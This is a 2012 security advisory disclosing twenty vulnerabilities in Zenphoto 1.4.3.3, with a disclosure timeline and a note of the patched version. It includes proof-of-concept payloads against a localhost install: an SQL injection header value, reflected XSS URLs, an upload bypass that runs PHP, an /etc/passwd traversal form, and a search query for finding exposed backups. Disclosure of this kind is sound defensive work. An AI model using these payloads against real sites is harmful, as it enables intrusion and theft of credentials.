@@ -1,0 +1,830 @@
+[waraxe-2012-SA#096] - Multiple Vulnerabilities in Zenphoto 1.4.3.3
+===============================================================================
+
+Author: Janek Vind "waraxe"
+Date: 03. November 2012
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-96.html
+
+
+Description of vulnerable software:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Zenphoto is a standalone CMS for multimedia focused websites. Our focus lies on
+being easy to use and having all the features there when you need them (but out
+of the way if you do not.)
+Zenphoto features support for images, video and audio formats, and the Zenpage
+CMS plugin provides a fully integrated news section (blog) and custom pages to
+run entire websites. 
+
+http://www.zenphoto.org/
+
+https://code.google.com/p/zenphoto/
+
+Affected versions: Zenphoto 1.4.3.3 and older
+Patched version: Zenphoto 1.4.3.4
+
+
+###############################################################################
+1. SQL Injection in "zp-core/zp-extensions/failed_access_blocker.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied HTTP header "X_FORWARDED_FOR"
+Preconditions:
+ 1. plugin "failed_access_blocker" activated (disabled by default)
+
+"failed_access_blocker" plugin will log every failed authentication attempt:
+ 
+Php script "zp-core/zp-extensions/failed_access_blocker.php" line 75:
+------------------------[ source code start ]----------------------------------
+function failed_access_blocker_adminGate($allow, $page) {
+...
+ //    add this attempt
+ $sql = 'INSERT INTO '.prefix('plugin_storage').' (`type`, `aux`,`data`) VALUES
+   ("failed_access", "'.time().'","'.getUserIP().'")';
+ query($sql);
+ //    check how many times this has happened recently
+ count = db_count('plugin_storage','WHERE `type`="failed_access" AND 
+   `data`="'.getUserIP().'"');
+------------------------[ source code end ]------------------------------------
+
+IP address of the user comes from function "getUserIP()" and is used in SQL
+query. Let's look at the function "getUserIP()".
+
+Php script "zp-core/functions.php" line 1979:
+------------------------[ source code start ]----------------------------------
+function getUserIP() {
+    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        return sanitize($_SERVER['HTTP_X_FORWARDED_FOR'], 0);
+    } else {
+        return sanitize($_SERVER['REMOTE_ADDR'], 0);
+------------------------[ source code end ]------------------------------------
+
+Function "sanitize()" does following things to the input data:
+ 1. strips slashes if magic_quotes_gpc=on
+ 2. strips null bytes
+ 3. strips html tags
+ 
+So we can see, that function "sanitize()" will prevent null byte tricks and
+most of the XSS exploits, but it does not escape or delete single and double
+quotes, therefore SQL Injection may still be possible. Actually this function
+makes SQL Injection more likely to occur because it reverts effects of the
+"magic_quotes_gpc". As result of such insuffient input data sanitization,
+attacker can use HTTP header "X_FORWARDED_FOR" for SQL Injection.
+
+Test:
+
+Let's use Firefox browser with Tamper Data Add-on.
+
+ 1. Open admin page:
+ 
+ http://localhost/zenphoto1433/zp-core/admin.php
+ 
+ 2. Activate Tamper data (Start Tamper)
+ 3. Try to log in with bogus credentials, Tamper Data triggers
+ 4. "Tamper with request?" -> "Tamper"
+ 5. "Add element" -> X_FORWARDED_FOR=war"axe
+ 6. Click "OK" and tampered request will go to the server 
+
+As result we will see blank page (OK 200 response code, content length 0).
+But let's look at "debug.log" in "zp-data":
+
+Backtrace: USER ERROR: MySql Error: ( <em>INSERT INTO `[prefix]plugin_storage`
+(`type`, `aux`,`data`) VALUES ("failed_access", "1349792737","war"axe")</em> )
+failed. MySql returned the error <em>You have an error in your SQL syntax; 
+check the manual that corresponds to your MySQL server version for the right
+syntax to use near 'axe")'
+
+
+###############################################################################
+2. SQL Injection in "zp-core/zp-extensions/search_statistics.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied HTTP header "X_FORWARDED_FOR"
+Preconditions:
+ 1. plugin "search_statistics" activated (disabled by default)
+
+
+Php script "zp-core/zp-extensions/search_statistics.php" line 101:
+------------------------[ source code start ]----------------------------------
+static function handler($search_statistics, $type, $success, $dynamic,
+    $iteration) {
+...
+ $sql = 'INSERT INTO '.prefix('plugin_storage').' (`type`, `aux`,`data`) VALUES
+  ("search_statistics", "'.getUserIP().'",'.db_quote(serialize($store)).')';
+ query($sql);
+------------------------[ source code end ]------------------------------------
+
+User's IP address comes from function "getUserIP()" and is used in SQL query.
+As shown in previous case, it is possible to use HTTP header "X_FORWARDED_FOR"
+for SQL Injection, because "getUserIP()" does not sufficiently sanitize
+user-supplied input data.
+
+
+###############################################################################
+3. IP address spoofing vulnerability via HTTP header "X_FORWARDED_FOR"
+###############################################################################
+
+Reason: trusting spoofable input data
+Attack vector: user-supplied HTTP header "X_FORWARDED_FOR"
+Preconditions: none
+
+We saw in two previous cases, that function "getUserIP()" can't be trusted,
+because attacker can easily spoof his/her IP addresss by using HTTP header
+"X_FORWARDED_FOR". Vulnerable function "getUserIP()" is heavily used in logging
+functionality.
+Example code lines from "zp-core/zp-extensions/security-logger.php":
+
+security_logger::Logger($success, $user, $name, getUserIP(), 'Back-end',
+ $auth, $pass);
+security_logger::Logger($success, $user, $name, getUserIP(), 'Front-end',
+  $athority, $pass);
+security_logger::Logger(false, $user, $name, getUserIP(), 'Blocked access',
+  '', $page);
+security_logger::Logger(false, $user, $name, getUserIP(), 'Blocked album',
+  '', $page);
+security_logger::Logger(true, $user, $name, getUserIP(), 'user_'.$class,
+  'zp_admin_auth', $userobj->getUser());
+security_logger::Logger(false, $user, $name, getUserIP(), 'XSRF access blocked',
+  '', $token);
+security_logger::Logger($allow, $user, $name, getUserIP(), $action,
+  'zp_admin_auth', basename($log));
+security_logger::Logger($success, $user, $name, getUserIP(), 'setup_'.$action,
+  'zp_admin_auth', $txt);
+
+So we can conclude, that it is possible for attacker to spoof IP address in
+Zenphoto security logs. By injecting newlines ("\n") and tabs ("\t") it's even
+possible to add arbitrary fake entries to the security logs.
+
+
+###############################################################################
+4. File Type Restriction Bypass Vulnerability in
+      "zp-core/zp-extensions/uploader_jQuery/uploader.php"
+###############################################################################
+Preconditions:
+ 1. Logged in as admin with image upload privileges
+ 2. "uploader_jQuery" plugin activated (active by default)
+
+ 
+Php script "zp-core/zp-extensions/uploader_jQuery/uploader.php" line 227:
+------------------------[ source code start ]----------------------------------
+private function handle_file_upload($uploaded_file, $name, $size, $type,
+  $error) {
+...
+ $error = $this->has_error($uploaded_file, $file, $error);
+ if (!$error && $file->name) {
+...
+   move_uploaded_file($uploaded_file, $file_path);
+   if (is_valid_image($name) || is_valid_other_type($name)) {
+...
+   } else {
+     $error = UPLOAD_ERR_EXTENSION;    // invalid file uploaded
+     break;
+------------------------[ source code end ]------------------------------------
+
+As seen above, uploaded file is first validated by function "has_error":
+
+Php script "zp-core/zp-extensions/uploader_jQuery/uploader.php" line 26:
+------------------------[ source code start ]----------------------------------
+$types = array_keys($_zp_extra_filetypes);
+$types = array_merge($_zp_supported_images, $types);
+$types = zp_apply_filter('upload_filetypes',$types);
+...
+$options = array(
+...
+  'accept_file_types' => '/('.implode('|',$types).')$/i'
+...
+private function has_error($uploaded_file, $file, $error) {
+...
+ if (!preg_match($this->options['accept_file_types'], $file->name)) {
+  return 'acceptFileTypes';
+------------------------[ source code end ]------------------------------------
+
+We can see, that "preg_match()" regex validation is used for file extension
+sanitization. Example validation regex from default installation:
+
+"/(gif|jpg|jpeg|png|bmp|flv|fla|3gp|mov|mp3|mp4|m4v|m4a)$/i"
+
+At first look it seems to be secure - only picture and video files are allowed
+to be uploaded. But if we analyze this regex little bit more, then we can spot
+one fatal flaw - it does not check for dot character before file extension.
+As result, it is possible to upload file named like "info.php.123png" and it
+will pass through first validation, done by "has_error()". We can see, that
+after "has_error()" uploaded file is moved from temporal location to the target
+album directory by "move_uploaded_file()" function. After that second
+validation by function "is_valid_image()" follows:
+
+Php script "zp-core/functions-basic.php" line 1173:
+------------------------[ source code start ]----------------------------------
+function is_valid_image($filename) {
+  global $_zp_supported_images;
+  $ext = strtolower(substr(strrchr($filename, "."), 1));
+  return in_array($ext, $_zp_supported_images);
+}
+------------------------[ source code end ]------------------------------------
+
+We can see, that file extension is checked again and this time it is secure
+validation and can't be fooled. This situation usually means, that exploitation
+is not possible, but not this time. Uploaded file is already moved to the target
+folder, directly accessible over HTTP and there is missing important piece of
+php code, which should delete such files. What code does after failed
+"is_valid_image()", is setting up error flag "UPLOAD_ERR_EXTENSION" followed by
+"break". This seems to be as syntax error from programmer and will lead to php
+fatal error: "Cannot break/continue 1 level". In my local testserver this means
+error 500 response from webserver, but still, file is uploaded to the target
+directory already and stays there, so exploitation is possible.
+
+Test:
+
+1. Log in as admin with image upload privileges and navigate to upload page:
+
+http://localhost/zenphoto1433/zp-core/admin-upload.php?page=upload&tab=albums
+
+Make sure, that "Upload handler" is "jQuery". In this test target album is
+"testalbum".
+
+2. Try to upload php file containing "<?php phpinfo()?>" and named as
+"info.php.123png"
+
+As result we can see error message:
+
+"info.php.123png  0.02 KB  Error: Internal Server Error"
+
+Still, despite of the error message, upload succeeded. Uploaded file can
+be accessed directly, resulting in php code execution:
+
+http://localhost/zenphoto1433/albums/testalbum/info.php.123png
+
+
+###############################################################################
+5. File Type Restriction Bypass Vulnerability in
+      "zp-core/admin-functions.php"
+###############################################################################
+Preconditions:
+ 1. Logged in as admin with image upload privileges
+ 2. "zip_open()" function not available
+
+ 
+Php script "zp-core/admin-functions.php" line 2565:
+------------------------[ source code start ]----------------------------------
+/**
+ * Unzips an image archive
+ *
+ * @param file $file the archive
+ * @param string $dir where the images go
+ */
+function unzip($file, $dir) { //check if zziplib is installed
+ if(function_exists('zip_open')) {
+  $zip = zip_open($file);
+  if ($zip) {
+   while ($zip_entry = zip_read($zip)) { // Skip non-images in the zip file.
+    $fname = zip_entry_name($zip_entry);
+    $seoname = internalToFilesystem(seoFriendly($fname));
+    if (is_valid_image($seoname) || is_valid_other_type($seoname)) {
+      if (zip_entry_open($zip, $zip_entry, "r")) {
+        $buf = zip_entry_read($zip_entry, zip_entry_filesize($zip_entry));
+...
+    } else {
+   require_once(dirname(__FILE__).'/lib-pclzip.php');
+   $zip = new PclZip($file);
+   if ($zip->extract(PCLZIP_OPT_PATH, $dir, PCLZIP_OPT_REMOVE_ALL_PATH) == 0) {
+------------------------[ source code end ]------------------------------------
+
+We can see that when "zip_open()" function is available, then Zenphoto will read
+zip entries from archieve one by one and there is as checking for file type.
+Only files with whitelisted extensions are extracted to the target folder.
+But in case of missing function "zip_open()" (specific lib not installed)
+custom third-party library "PclZip" will be used, this time without any checks
+for file extensions. So it is possible to upload zip archive with php files
+inside and they will be extracted to the target album, allowing attacker to
+gain php level access.
+
+
+###############################################################################
+6. File Existence Disclosure in 
+   "zp-core/zp-extensions/uploader_flash/check.php"
+###############################################################################
+Preconditions: none
+
+ 
+Php script "zp-core/zp-extensions/uploader_flash/check.php" line 26:
+------------------------[ source code start ]----------------------------------
+$fileArray = array();
+foreach ($_POST as $key => $value) {
+  if ($key != 'folder') {
+   if (file_exists($_SERVER['DOCUMENT_ROOT'] . $_POST['folder'] . '/' . $value)) {
+     $fileArray[$key] = $value;
+   }
+  }
+}
+echo json_encode($fileArray);
+------------------------[ source code end ]------------------------------------
+
+Test:
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/zenphoto1433/zp-core/zp-extensions/uploader_flash/check.php" method="post">
+<input type="hidden" name="folder" value="">
+<input type="hidden" name="test" value="../../../../../../../../etc/passwd">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+Result:
+
+{"test":"..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd"}
+
+Attacker is able to detect file presence on remote server, because server
+response is different in case of existing and non-existent files. 
+
+
+###############################################################################
+7. Database Backup Files Unauthorized Access Vulnerability
+###############################################################################
+
+Zenphoto offers database backup functionality in admin interface:
+
+Php script "zp-core/utilities/backup_restore.php" line 140:
+------------------------[ source code start ]----------------------------------
+if (isset($_REQUEST['backup']) && db_connect()) {
+...
+  $folder = SERVERPATH . "/" . BACKUPFOLDER;
+  $filename = $folder . '/backup-' . date('Y_m_d-H_i_s').'.zdb';
+  if (!is_dir($folder)) {
+    mkdir ($folder, FOLDER_MOD);
+  }
+  @chmod($folder, FOLDER_MOD);
+  $handle = fopen($filename, 'w');
+------------------------[ source code end ]------------------------------------
+
+We can see that database backup files are named using simple naming scheme.
+Created backup files are directly accessible without any restrictions:
+
+http://localhost/zenphoto1433/backup/backup-2012_10_07-19_20_15.zdb
+
+As result there may be leakage of sensitive information, like admin's hashed
+credentials:
+
+s:4:"user";s:6:"waraxe";s:4:"pass";s:40:"123456789abcdef123456789abc...
+  
+There is "IndexIgnore *" directive in ".htaccess" file, so by default
+directory browsing is not possible and filename must be guessed somehow,
+but still there are vulnerable zenphoto installations on Internet:
+  
+Google Dork:
+filetype:zdb inurl:backup
+
+Besides, there is about 60 * 60 * 24 * 365 = 31 536 000 possible filenames
+per year, so it is possible to use bruteforce method and try to guess backup's
+filename.
+
+
+###############################################################################
+8. Reflected XSS in "zp-core/zp-extensions/federated_logon/OpenID_logon.php"
+###############################################################################
+
+Reason:
+ 1. uninitialized variables "$msg", "$error", "$success"
+ 2. insufficient sanitization of html output
+Attack vector:
+ 1. user-supplied parameters "msg", "error", "success"
+ 2. user-supplied GET parameter "redirect"
+Preconditions:
+ 1. register_globals=on (for parameters "msg", "error", "success")
+ 
+
+Php script "zp-core/zp-extensions/federated_logon/OpenID_logon.php" line 38:
+------------------------[ source code start ]----------------------------------
+<?php if (isset($msg)) { print "<div class=\"alert\">$msg</div>"; } ?>
+<?php if (isset($error)) { print "<div class=\"error\">$error</div>"; } ?>
+<?php if (isset($success)) { print "<div class=\"success\">$success</div>"; } ?>
+------------------------[ source code end ]------------------------------------
+    
+Tests:
+
+http://localhost/zenphoto1433/zp-core/zp-extensions/federated_logon/OpenID_logon.php?msg=<script>alert(123);</script>
+http://localhost/zenphoto1433/zp-core/zp-extensions/federated_logon/OpenID_logon.php?error=<script>alert(123);</script>
+http://localhost/zenphoto1433/zp-core/zp-extensions/federated_logon/OpenID_logon.php?success=<script>alert(123);</script>
+http://localhost/zenphoto1433/zp-core/zp-extensions/federated_logon/OpenID_logon.php?redirect="+onclick=alert(123)+w="
+
+
+###############################################################################
+9. Reflected XSS in "zp-core/zp-extensions/federated_logon/Verisign_logon.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied GET parameter "redirect"
+Preconditions: none
+ 
+Test:
+
+http://localhost/zenphoto1433/zp-core/zp-extensions/federated_logon/Verisign_logon.php?redirect="+onclick=alert(123)+w="
+
+
+###############################################################################
+10. Reflected XSS in "themes/stopdesign/comment_form/comment_form.php"
+###############################################################################
+
+Reason:
+ 1. uninitialized variable "$_zp_themeroot"
+ 2. insufficient sanitization of html output
+Attack vector: user-supplied parameter "_zp_themeroot"
+Preconditions: register_globals=on
+ 
+ 
+Php script "themes/stopdesign/comment_form/comment_form.php" line 5:
+------------------------[ source code start ]----------------------------------
+global $_zp_themeroot;
+?>
+<p class="mainbutton" id="addcommentbutton"><a href="#addcomment" class="btn">
+  <img src="<?php echo $_zp_themeroot ?>
+------------------------[ source code end ]------------------------------------
+    
+Tests:
+
+http://localhost/zenphoto1433/themes/stopdesign/comment_form/comment_form.php?_zp_themeroot="><script>alert(123);</script>
+
+
+###############################################################################
+11. Reflected XSS in "zp-core/zp-extensions/cloneZenphoto/cloneTab.php"
+###############################################################################
+
+Reason:
+ 1. uninitialized variable "$msg"
+ 2. insufficient sanitization of html output
+Attack vector:
+ 1. user-supplied parameter "msg"
+ 2. user-supplied POST parameter "path"
+Preconditions:
+ 1. logged in as admin
+ 2. register_globals=on (for variable "$msg")
+ 
+
+First XSS vulnerability is caused by uninitialized variable "$msg":
+
+http://localhost/zenphoto1433/zp-core/zp-extensions/cloneZenphoto/cloneTab.php?success=1&msg[]=<script>alert(123);</script>
+
+Second XSS vulnerability relates to POST parameter "path":
+
+Php script "zp-core/zp-extensions/cloneZenphoto/cloneTab.php" line 62:
+------------------------[ source code start ]----------------------------------
+if (isset($_POST['path'])) {
+  $path = sanitize($_POST['path']);
+ } else {
+...
+$downtitle = '.../'.basename($path);
+...
+<script type="text/javascript">
+...
+  function folderChange() {
+    $('#downbutton').attr('title','<?php echo $downtitle; ?>
+------------------------[ source code end ]------------------------------------
+
+
+Test:
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/zenphoto1433/zp-core/zp-extensions/cloneZenphoto/cloneTab.php" method="post">
+<input type="hidden" name="path" value="');};alert(123);function q(){var w=('">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+
+###############################################################################
+12. Reflected XSS in "zp-core/admin-thumbcrop.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied parameters "subpage" and "tagsort"
+Preconditions: logged in as admin
+ 
+
+Php script "zp-core/admin-thumbcrop.php" line 160:
+------------------------[ source code start ]----------------------------------
+$subpage = sanitize($_REQUEST['subpage']);
+$tagsort = sanitize($_REQUEST['tagsort']);
+...
+<button type="reset" 
+...
+   &subpage=<?php echo $subpage; ?>&tagsort=<?php echo $tagsort; ?>
+------------------------[ source code end ]------------------------------------
+    
+Tests (parameters "a" and "i" must be valid):
+
+http://localhost/zenphoto1433/zp-core/admin-thumbcrop.php?a=testalbum&i=waraxe.jpg&subpage='"+autofocus+onFocus="alert(123);//
+http://localhost/zenphoto1433/zp-core/admin-thumbcrop.php?a=testalbum&i=waraxe.jpg&tagsort='"+autofocus+onFocus="alert(123);//
+
+
+###############################################################################
+13. Reflected XSS in "zp-core/admin-upload.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied GET parameters "folderdisplay" and "albumtitle"
+Preconditions: logged in as admin
+ 
+ 
+Php script "zp-core/admin-upload.php" line 306:
+------------------------[ source code start ]----------------------------------
+if (isset($_GET['folderdisplay'])) {
+ ?>
+    $('#folderdisplay').val('<?php echo sanitize($_GET['folderdisplay']); ?>');
+...
+if (isset($_GET['albumtitle'])) {
+ ?>
+    $('#albumtitle').val('<?php echo sanitize($_GET['albumtitle']); ?>');
+------------------------[ source code end ]------------------------------------
+    
+Tests:
+
+http://localhost/zenphoto1433/zp-core/admin-upload.php?folderdisplay=');alert('xss
+http://localhost/zenphoto1433/zp-core/admin-upload.php?albumtitle=');alert('xss
+
+
+###############################################################################
+14. Reflected XSS in "zp-core/admin-tags.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied parameter "tagsort"
+Preconditions: logged in as admin
+ 
+ 
+Php script "zp-core/admin-tags.php" line 14:
+------------------------[ source code start ]----------------------------------
+if (isset($_REQUEST['tagsort'])) {
+    $tagsort = sanitize($_REQUEST['tagsort'], 0);
+...
+<form name="tag_delete" action="?delete=true&tagsort=<?php echo $tagsort;
+...
+<form name="tag_rename" action="?rename=true&tagsort=<?php echo $tagsort;
+...
+<form name="new_tags" action="?newtags=true&tagsort=<?php echo $tagsort;
+------------------------[ source code end ]------------------------------------
+    
+Test:
+
+http://localhost/zenphoto1433/zp-core/admin-tags.php?tagsort="><script>alert(123);</script>
+
+
+###############################################################################
+15. Reflected XSS in "zp-core/admin-users.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied GET parameter "error"
+Preconditions: logged in as admin
+
+
+Php script "zp-core/admin-users.php" line 406:
+------------------------[ source code start ]----------------------------------
+case 'format':
+  echo '<h2>'.urldecode(sanitize($_GET['error'],2)).'</h2>';
+------------------------[ source code end ]------------------------------------
+    
+Test:
+
+http://localhost/zenphoto1433/zp-core/admin-users.php?page=users&mismatch=format&error=%253cscript%253ealert(123);%253c/script%253e
+
+
+###############################################################################
+16. Reflected XSS in
+       "zp-core/zp-extensions/tiny_mce/plugins/tinyzenpage/js/dialog.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied GET parameter "album"
+Preconditions: logged in as admin
+
+
+Php script "zp-core/zp-extensions/tiny_mce/plugins/tinyzenpage/js/dialog.php"
+line 50:
+------------------------[ source code start ]----------------------------------
+var albumname = '<?php if(isset($_GET["album"]))  
+  { echo sanitize($_GET["album"]); } else { $_GET["album"] = ""; } ?>';
+------------------------[ source code end ]------------------------------------
+    
+Test:
+
+http://localhost/zenphoto1433/zp-core/zp-extensions/tiny_mce/plugins/tinyzenpage/tinyzenpage.php?album=';}};alert(123);var+kala={zzz+:+function(ed){var+qwe='
+
+
+###############################################################################
+17. Reflected XSS in
+       "zp-core/zp-extensions/tiny_mce/config/zenpage-default-full.js.php"
+###############################################################################
+
+Reason:
+ 1. uninitialized variable "locale"
+ 2. insufficient sanitization of html output
+Attack vector: user-supplied parameter "locale"
+Preconditions: register_globals=on
+ 
+ 
+Php script "zp-core/zp-extensions/tiny_mce/config/zenpage-default-full.js.php"
+line 14:
+------------------------[ source code start ]----------------------------------
+<script type="text/javascript">
+...
+  language: "<?php echo $locale; ?>",
+------------------------[ source code end ]------------------------------------
+    
+Test:
+
+http://localhost/zenphoto1433/zp-core/zp-extensions/tiny_mce/config/zenpage-default-full.js.php?locale=</script><script>alert(123);</script>
+
+
+###############################################################################
+18. Reflected XSS in "zp-core/admin-comments.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied GET parameter "ndeleted"
+Preconditions: logged in as admin
+
+
+Php script "zp-core/admin-comments.php" line 279:
+------------------------[ source code start ]----------------------------------
+if ((isset($_GET['ndeleted']) && $_GET['ndeleted'] > 0) ||
+   isset($_GET['sedit'])) {
+?>
+<div class="messagebox fade-message">
+<?php
+ if (isset($_GET['ndeleted'])) {
+?>
+  <h2><?php echo $_GET['ndeleted']; ?> 
+------------------------[ source code end ]------------------------------------
+    
+Tests:
+
+http://localhost/zenphoto1433/zp-core/admin-comments.php?sedit=1&ndeleted=<script>alert(123);</script>
+http://localhost/zenphoto1433/zp-core/admin-comments.php?ndeleted=1<script>alert(123);</script>
+
+
+###############################################################################
+19. Reflected XSS in "zp-core/zp-extensions/GoogleMap/m.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied GET parameter "data"
+Preconditions: none
+Remarks: bypasses IE, Chrome and Safari anti-XSS features
+
+Php script "zp-core/zp-extensions/GoogleMap/m.php" line 57:
+------------------------[ source code start ]----------------------------------
+$mapdata = base64_decode(str_replace(' ', '+', sanitize($_GET['data'])));
+ if ($mapdata) {
+  if (function_exists('bzcompress')) {
+    $mapdata = bzdecompress($mapdata);
+  } else {
+    $mapdata = gzuncompress($mapdata);
+  }
+  $mapdata = unserialize($mapdata);
+ }
+...
+if (is_array($mapdata)) {
+  $MAP_OBJECT = new GoogleMapAPI(sanitize($_GET['type']));
+...
+  foreach ($mapdata as $key=>$datum) {
+    $MAP_OBJECT->$key = $datum;
+  }
+...
+  echo $MAP_OBJECT->printMap();
+------------------------[ source code end ]------------------------------------
+
+We can see, that user-supplied GET parameter "data" will be base64-decoded and
+then decompressed and unserialized to the array "mapdata". This is followed by
+creation of "GoogleMapAPI" object and after that array "mapdata" is used for
+populating "GoogleMapAPI"-s members. It means, that attacer is able to manipulate
+with arbitrary members of the "GoogleMapAPI" object.
+
+Php script "zp-core/zp-extensions/GoogleMap/GoogleMap.php" line 304:
+------------------------[ source code start ]----------------------------------
+class GoogleMapAPI {
+...
+var $js_alert = '<b>Javascript must be enabled in order to use Google Maps.</b>';
+...
+function printMap() {
+  echo $this->getMap();
+...
+function getMap() {
+...
+  if(!empty($this->js_alert)) {
+    $_output .= '<noscript>' . $this->js_alert . '</noscript>' . "\n";
+------------------------[ source code end ]------------------------------------
+
+We can see that "GoogleMapAPI" member "js_alert" is used in method "printMap()".
+Therefore attacker can overwrite "js_alert" with XSS payload.
+
+First we need for testing serialized, compressed and base64_encoded data. This
+can be obtained using php script below:
+-------------------------[ test code start ]-----------------------------------
+<?php
+error_reporting(E_ALL);
+$arr = array();
+$arr['js_alert']='</noscript><script>alert(123);</script>';
+$bz = base64_encode(bzcompress(serialize($arr)));
+$gz = base64_encode(gzcompress(serialize($arr)));
+echo "bz: $bz\n";
+echo "gz: $gz\n";
+?>
+--------------------------[ test code end ]------------------------------------
+
+Tests:
+
+In case of bz compression:
+
+http://localhost/zenphoto1433/zp-core/zp-extensions/GoogleMap/m.php?data=QlpoNDFBWSZTWcu%2fgEMAAA%2bbgBBguH0AAKo13AogAFRQAAADIGVNNNGmZIMBGEgGPQOa%2flg2jGWBuiGSqXfdt1NRk8QHt7GpsF8DBGJPFBvxdyRThQkMu%2fgEMA
+
+
+In case of gz compression:
+
+http://localhost/zenphoto1433/zp-core/zp-extensions/GoogleMap/m.php?data=eJxLtDK0qi62srBSyiqOT8xJLSpRsi62Mra0UrLRz8svTi7KLCixs4HSYHkNQyNjTWsbfaiYknUtAP1BFmU
+
+
+###############################################################################
+20. Full Path Disclosure in multiple scripts
+###############################################################################
+
+http://localhost/zenphoto1433/themes/default/theme_description.php
+
+Fatal error: Call to undefined function gettext() in
+C:\apache_www\zenphoto1433\themes\default\theme_description.php on line 4
+
+More affected scripts:
+
+themes/effervescence_plus/colorbox/functions.php
+themes/effervescence_plus/simpleviewer/functions.php
+themes/effervescence_plus/functions.php
+themes/effervescence_plus/index.php
+themes/effervescence_plus/sidebar.php
+themes/effervescence_plus/theme_description.php
+themes/garland/colorbox/functions.php
+themes/garland/contact_form/form.php
+themes/garland/functions.php
+themes/garland/index.php
+themes/garland/sidebar.php
+themes/garland/theme_description.php
+themes/garland/themeoptions.php
+themes/stopdesign/comment_form/comment_form.php
+themes/stopdesign/contact_form/form.php
+themes/stopdesign/comment.php
+themes/stopdesign/functions.php
+themes/stopdesign/normalizer.ph
+themes/stopdesign/theme_description.php
+themes/zenpage/footer.php
+themes/zenpage/functions.php
+themes/zenpage/sidebar.php
+themes/zenpage/theme_description.php
+themes/zpmobile/comment_form/comment_form.php
+themes/zpmobile/functions.php
+themes/zpmobile/theme_description.php
+
+zp-core/utilities/refresh_database.php
+zp-core/utilities/refresh_metadata.php
+zp-core/404.php
+zp-core/auth_zp.php
+zp-core/class-album.php
+zp-core/class-comment.php
+zp-core/class-gallery.php
+zp-core/class-image.php
+zp-core/class-load.php
+zp-core/class-search.php
+zp-core/class-transientimage.php
+zp-core/controller.php
+zp-core/functions-controller.php
+zp-core/functions-i18n.php
+zp-core/lib-GD.php
+zp-core/lib-Imagick.php
+zp-core/lib-utf8.php
+
+zp-core/zp-extensions/admin-approval.php
+
+many more scripts in "/zp-core/zp-extensions/" directory
+
+
+Disclosure timeline:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+15.10.2012 -> Contacted developers
+15.10.2012 -> Developers asked for details
+15.10.2012 -> Sent details to developers
+02.11.2012 -> Patched version 1.4.3.4 released
+03.11.2012 -> Advisory released
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+Waraxe forum:  http://www.waraxe.us/forums.html
+Personal homepage: http://www.janekvind.com/
+Random project: http://albumnow.com/
+---------------------------------- [ EOF ] ------------------------------------
